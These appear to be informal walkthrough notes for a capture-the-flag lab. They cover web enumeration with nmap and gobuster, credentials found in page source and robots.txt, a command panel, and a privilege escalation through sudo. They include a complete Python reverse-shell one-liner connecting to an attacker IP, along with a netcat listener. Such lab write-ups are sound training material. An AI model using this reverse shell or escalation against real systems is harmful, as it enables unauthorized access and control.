Lets first go to the website
Run an NMAP
	nmap -sC -sV -p- -vv 10.10.23.174
Inspect element on website while everything is loading
	When we inspect element we can see a note to self about a username, the username is 
	Note to self, remember username!
    	Username: R1ckRul3s
Now lets run gobuster
	gobuster dir -u 10.10.23.174 -w /usr/share/wordlists/dirb/big.txt 
		We start to get a lot of stuff
		Looking first at assets, there is nothing really there and nothing to inspect
		Lets move to robots.txt
			Wubbalubbadubdub (dont know what this means yet)
	we still have a username and nowhere to put it, SSH is not working for us with that username and IP address
		Lets do a gobuster again and this time look for php,txt,zip and html extensions
			gobuster dir -u 10.10.23.174 -w /usr/share/wordlists/dirb/big.txt -x php,zip,txt,html
		At the same time i did a medium.txt file for gobuster
			gobuster dir -u 10.10.23.174 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt 
		We found a login .php under the big.txt
		We already know the username and found the password in robots.txt
			Username: R1ckRul3s
			Password: Wubbalubbadubdub
	Once logged in we can type in Linux commands
		ls -la
		we see a file for super secret, but we cannot open it
		nano and cat are not giving us anything, lets try less
		less Sup3rS3cretPickl3Ingred.txt (less displays file contents without trying to open the file)
	We cannot find anything else, lets try to open a reverse shell to obtain another password or obtain more files
		nc -lnvp 9999 (on cmd line in kali)
		now to a reverse python script
			we do not need to know how to script python, we can use a cheat sheet located here
				https://jaytaylor.com/notes/node/1520886669000.html
			Go down to the python section and make sure to change the IP address and LPORT for the cheatsheet
		Type in following (the IP address is your local kali linux machine, the port is the port you gave it)
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.6.23.228",9999));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);' 
	Now within command line in linux we can use linux commands (ls -la)
		Looking at clue.txt it says to search around the file systems
		lets first look at /home
			ls -la
			we can now see 2 folders
			lets go into rick
				ls
				less "second ingredients"
					1 jerry tear
		lets lastly try to go into root
			whoami shows that you are not an admin
			we are not able to get into root with the current priveleges
			sudo -l
			still nothing
			sudo bash -i (now we are in)
				cd /root
				less 3rd.txt
